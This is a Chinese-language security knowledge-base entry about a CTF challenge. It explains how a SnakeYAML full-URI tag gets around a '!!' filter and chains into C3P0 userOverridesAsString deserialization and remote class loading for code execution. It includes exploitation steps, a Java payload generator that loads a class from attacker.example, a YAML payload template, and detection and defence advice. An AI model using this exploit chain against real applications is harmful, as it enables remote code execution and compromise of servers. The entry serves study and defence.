---
id: web-java-deser-snakeyaml-full-tag-c3p0-useroverrides
title: SnakeYAML !<tag:yaml.org,2002:类名> 全写标签绕过 !! 过滤，触发 C3P0 userOverridesAsString 二次反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: snakeyaml-full-tag-c3p0-useroverrides-secondary-deser
tags:
- java
- deserialization
- snakeyaml
- c3p0
- yaml
- filter-bypass
- secondary-deserialization
- urlclassloader
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:42:51+08:00'
  notes: 已对照 CISCN2023华北 normal_snake 全文：/read 只拦 !!、JAVA/JNDI/JDBC 与两个类名十六进制串；PoC 用 !<tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource> + userOverridesAsString=HexAsciiSerializedMap:<PoolBackedDataSourceBase hex>，内层 ReferenceableUtils.referenceToObject+URLClassLoader 远程类加载，与原文一致；原文未附该题执行截图，confidence medium 合理。affected_versions 原为题目依赖版本（snakeyaml 1.30、c3p0 0.9.5.2），非受影响区间，已按简报清除。未在本机复跑。
url: /docs/web/java/deserialization/web-java-deser-snakeyaml-full-tag-c3p0-useroverrides/
draft: false
kb_aliases:
- SnakeYAML 全写标签绕过
- '!<tag:yaml.org,2002:> 绕过 !!'
- snakeyaml c3p0 userOverridesAsString
- WrapperConnectionPoolDataSource YAML
- normal_snake
---

## 一句话结论

当应用对 SnakeYAML 输入只做 `data.contains("!!")` 与 `JAVA/JNDI/JDBC` 等字符串过滤时，YAML 的等价全写标签 `!<tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource>` 不含 `!!` 即可穿过过滤；`Yaml.load` 会实例化该 c3p0 bean 并调用 `setUserOverridesAsString`，其 `HexAsciiSerializedMap:<hex>` 值被 c3p0 解析后交给原生 `ObjectInputStream.readObject()`，把 `PoolBackedDataSourceBase` + `ReferenceableUtils.referenceToObject` 的远程类加载链送入目标完成 RCE。

## 原理

- **SnakeYAML 的两种全局标签写法**：默认 `Yaml.load` 的 Constructor 支持 `!!com.example.Class` 简写，也支持 `!<tag:yaml.org,2002:com.example.Class>` 完整 URI 写法；两者语义相同，但后者的字符串里没有连续的两个感叹号。只检查 `!!` 的过滤器因此被绕过。
- **为什么能实例化 c3p0 bean**：`Yaml.load` 遇到带类名标签的映射时，会按 `tag:yaml.org,2002:<类名>` 解析目标类、实例化无参对象，并把 YAML 键值通过 JavaBean setter 注入。`WrapperConnectionPoolDataSource` 有 `userOverridesAsString` 属性，setter 即 `setUserOverridesAsString`。
- **userOverridesAsString 的二次反序列化**：c3p0 的 `setUserOverridesAsString` 调用 `C3P0ImplUtils.parseUserOverridesAsString`；字符串以 `HexAsciiSerializedMap:` 开头时，去掉前缀、把十六进制还原为字节，再 `SerializableUtils.fromByteArray` → `new ObjectInputStream(...).readObject()`。也就是说 YAML 值本身就是一个“可控字节数组 → 原生反序列化”的入口。
- **内层 sink**：十六进制里放序列化后的 `PoolBackedDataSourceBase`，其 `connectionPoolDataSource` 字段指向一个实现 `ConnectionPoolDataSource` 与 `Referenceable` 的攻击者类；序列化时 c3p0 把无法直接序列化的字段封装成 `ReferenceSerialized`（内部保存 `getReference()` 返回的 `Reference`）。内层反序列化时 `ReferenceSerialized.getObject()` → `ReferenceableUtils.referenceToObject()`；`Reference.factoryClassLocation` 非空时创建 `URLClassLoader`，`Class.forName(factoryClassName, true, loader)` 加载远程类并实例化，静态初始化块先执行，完成 RCE。
- **过滤为何失效**：`SafeConstructorWithException` 只检查大写后的 `JAVA`/`JNDI`/`JDBC` 关键字与 `BadAttributeValueExpException`/`HotSwappableTargetSource` 的十六进制类名；本链使用的类名 `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`、`PoolBackedDataSourceBase`、`ReferenceableUtils` 不含这些关键字，十六进制值也不是被点名的两个类。过滤维度与真实危险面不匹配。
- **与不出网打法的边界**：原文说明 Tomcat 9 环境下 `BeanFactory` 不出网打法不可用，最终走 `referenceToObject` 远程类加载，需要目标能访问攻击者 HTTP 服务（`factoryClassLocation`）；若目标完全不出网，需换成本地可写文件/本地工厂等其它 sink。

## 触发条件

- 应用把不可信输入交给 `Yaml.load()`（默认 Constructor，未显式限制类型）。
- classpath 含 SnakeYAML（原文 1.30）与 c3p0 0.9.5.2。
- 输入过滤只做简单字符串匹配（`!!`、`JAVA`/`JNDI`/`JDBC`、特定类名十六进制），未使用 `SafeConstructor` 的类型白名单。
- 目标可出网访问攻击者的 HTTP 服务以加载 `factoryClassLocation` 指向的类（适用于本链的远程类加载形态）。
- JDK 未对 `URLClassLoader`/远程类加载做额外限制，进程可加载并初始化远程类。

## 利用步骤

1. 构造内层攻击者类：实现 `ConnectionPoolDataSource` 与 `Referenceable`，`getReference()` 返回 `new Reference("exploit", "evil", "http://attacker:9999/")`（原文形态）。
2. 构造 `PoolBackedDataSourceBase(false)`，反射把 `connectionPoolDataSource` 设为该对象；序列化得到字节并转十六进制（`HexAsciiSerializedMap:<hex>`）。
3. 在攻击者 HTTP 根目录放置 `evil.class`（实现 `ObjectFactory`，静态初始化块执行命令）。
4. 构造 YAML：`!<tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource> {userOverridesAsString: "HexAsciiSerializedMap:<hex>;"}`。
5. 投递到 `/read?data=...`；`Yaml.load` 实例化 c3p0 bean 并调用 setter，内层反序列化触发 `referenceToObject`，目标从攻击者 HTTP 加载并初始化 `evil`，命令执行。
6. 验证：攻击者 HTTP 收到 `evil.class` 请求并返回；目标侧执行命令。失败时检查 YAML 标签写法、过滤是否覆盖全写形式、c3p0 版本、Tomcat 的工厂限制与出网。

## PoC

```java
// 内层 payload 生成（省略 hex 工具；未在本机复跑）
public static class EvilReferenceable implements ConnectionPoolDataSource, Referenceable {
    public Reference getReference() {
        return new Reference("exploit", "evil", "http://attacker.example:9999/");
    }
    // 其余 ConnectionPoolDataSource 方法返回 null/0 即可
}

PoolBackedDataSourceBase dsb = new PoolBackedDataSourceBase(false);
setField(dsb, "connectionPoolDataSource", new EvilReferenceable());
String hex = toHex(serialize(dsb));

String yaml = "!<tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource> "
        + "{userOverridesAsString: \"HexAsciiSerializedMap:" + hex + ";\"}";
```

说明：远程 `evil.class` 需实现 `ObjectFactory`；`Class.forName(..., true, loader)` 会先执行静态初始化块。原文未附该题执行截图，本卡 confidence 记 medium。

## 变体与关联

- [[web-java-deser-fastjson-c3p0-hex-useroverrides]]：同一个 c3p0 `userOverridesAsString` 十六进制二次反序列化 sink，入口换成 fastjson AutoType；本卡入口是 SnakeYAML 全写标签，并利用 `!!` 过滤绕过。
- [[web-java-deser-c3p0-poolbackeddatasourcebase-urlclassloader]]：内层 `PoolBackedDataSourceBase` → `ReferenceableUtils.referenceToObject` 远程类加载的完整分析。
- [[web-java-deser-snakeyaml-loadas-blacklist-double-encode-file-xml]]：SnakeYAML 黑名单/双重编码绕过的同类思路，可对照过滤维度差异。
- [[web-java-deser-nacos-config-yaml-snakeyaml-yaml-payload-rce]]：SnakeYAML `Yaml.load` 不可信配置的入口卡。
- 变体：c3p0 的其它 ConnectionPoolDataSource 子类/其它接受十六进制序列化的 setter；全写标签也可用于其它 `!!` 黑名单绕过（如 `!<tag:yaml.org,2002:javax.script.ScriptEngineManager>`）。
- 边界：使用 `SafeConstructor`/类型白名单、c3p0 不在 classpath、目标完全不出网且无本地 sink 时链断。

## 检测与防御

- 检测：请求体中出现 `!<tag:yaml.org,2002:` 或 `!!` 后跟 c3p0/`java.*` 类名；`HexAsciiSerializedMap:` 字符串；反序列化后出现 c3p0 `ReferenceableUtils`/`URLClassLoader` 调用栈与异常 HTTP 出站。
- 防御：使用 `SafeConstructor`/显式类型白名单解析 YAML，不使用默认 Constructor 处理不可信输入；过滤应基于解析后的类型而非字符串；移除不必要的 c3p0 依赖或禁用 `userOverridesAsString`；限制服务端出站 HTTP；JEP 290 类白名单。
- 响应：保留 YAML 原文与网络日志，检查是否加载了远程类，排查同类 `!!` 过滤器绕过。
